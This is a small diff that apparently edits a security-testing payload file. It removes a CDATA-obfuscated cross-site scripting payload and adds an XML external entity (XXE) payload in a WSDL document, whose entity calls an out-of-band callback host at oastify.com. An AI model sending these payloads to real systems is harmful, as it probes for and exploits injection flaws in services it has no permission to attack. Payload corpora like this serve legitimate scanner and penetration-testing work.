@@ -1,1 +1,6 @@
-<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
+<!DOCTYPE wsdl:definitions [
+  <!ENTITY xxe SYSTEM "http://rd87jv1truvho7pt2ukts1etikobc27qw.oastify.com">
+]>
+<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
+  <wsdl:documentation>&xxe;</wsdl:documentation>
+</wsdl:definitions>
